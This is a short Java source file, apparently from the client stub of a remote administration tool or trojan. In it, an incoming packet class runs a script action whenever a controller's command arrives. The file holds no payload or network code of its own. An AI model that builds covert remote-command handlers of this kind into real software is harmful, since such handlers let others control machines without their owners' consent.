package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Script;

public class Packet35Script extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Script().perform();
	}

}
